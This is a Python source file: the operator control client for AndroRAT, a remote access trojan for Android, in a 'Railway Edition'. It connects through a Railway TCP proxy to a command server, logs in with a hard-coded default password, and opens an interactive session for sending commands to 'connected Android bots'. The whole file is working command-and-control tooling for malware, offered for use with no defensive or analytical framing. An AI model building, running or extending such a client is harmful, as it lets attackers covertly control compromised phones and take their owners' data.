#!/usr/bin/env python3
"""
AndroRAT Control Client - Railway Version
===========================================
Connects to the Railway TCP Proxy endpoint as an operator.
Provides interactive control over connected Android bots.

Usage:
  python3 control_client.py <host> <port> [password]
  
Example:
  python3 control_client.py shuttle.proxy.rlwy.net 12345
  python3 control_client.py shuttle.proxy.rlwy.net 12345 mypassword
"""

import sys
import os
import socket
import select
import threading
import time

BANNER = """
                    _           _____         _______
    /\\             | |         |  __ \\     /\\|__   __|
   /  \\   _ __   __| |_ __ ___ | |__) |   /  \\  | |
  / /\\ \\ | '_ \\ / _` | '__/ _ \\|  _  /   / /\\ \\ | |
 / ____ \\| | | | (_| | | | (_) | | \\ \\  / ____ \\| |
/_/    \\_\\_| |_|\\__,_|_|  \\___/|_|  \\_\\/_/    \\_\\_|
                                        - Railway Edition
"""

def recv_until(sock, marker="", timeout=30):
    """Receive data until marker or timeout"""
    data = b""
    sock.settimeout(timeout)
    try:
        while marker not in data.decode("UTF-8", "ignore"):
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    except Exception as e:
        pass
    finally:
        sock.settimeout(None)
    return data.decode("UTF-8", "ignore")

def recv_timeout(sock, timeout=2):
    """Receive available data with timeout"""
    data = b""
    sock.settimeout(timeout)
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except (socket.timeout, BlockingIOError):
        pass
    except Exception:
        pass
    finally:
        try:
            sock.settimeout(None)
        except Exception:
            pass
    return data.decode("UTF-8", "ignore")

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <host> <port> [password]")
        print(f"       {sys.argv[0]} shuttle.proxy.rlwy.net 12345")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    password = sys.argv[3] if len(sys.argv) > 3 else "androrat-admin"

    print(f"[*] Connecting to {host}:{port}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(15)

    try:
        sock.connect((host, port))
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        sys.exit(1)

    sock.settimeout(None)

    # Authenticate
    sock.send(f"AUTH:{password}\n".encode())
    time.sleep(0.5)

    # Receive initial response
    response = recv_timeout(sock, timeout=3)
    if "Authenticated" not in response:
        print(f"[-] Authentication failed!")
        print(f"[-] Response: {response[:200]}")
        sock.close()
        sys.exit(1)

    print("[+] Authenticated successfully!")
    print(response)

    # Interactive session with server-driven menu
    try:
        while True:
            # Show server prompt
            print("[*] Waiting for server prompt...")

            # Use a receiver thread for non-blocking reads
            sock.settimeout(0.5)

            while True:
                # Check for server messages
                try:
                    data = sock.recv(4096).decode("UTF-8", "ignore")
                    if not data:
                        print("\n[-] Connection closed by server")
                        return
                    print(data, end="", flush=True)

                    # If we see a prompt, we can send commands
                    if data.rstrip().endswith(">"):
                        break
                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"\n[-] Error: {e}")
                    return

            # Get user input
            try:
                user_input = input()
            except (EOFError, KeyboardInterrupt):
                print()
                sock.send(b"exit\n")
                break

            if not user_input:
                continue

            # Send command
            sock.send(f"{user_input}\n".encode())

            if user_input.strip().lower() == "exit":
                break

    except (ConnectionResetError, BrokenPipeError, EOFError):
        print("\n[-] Connection to server lost")
    except KeyboardInterrupt:
        print("\n[*] Interrupted")
        sock.send(b"exit\n")
    finally:
        sock.close()
        print("[*] Disconnected")

if __name__ == "__main__":
    main()

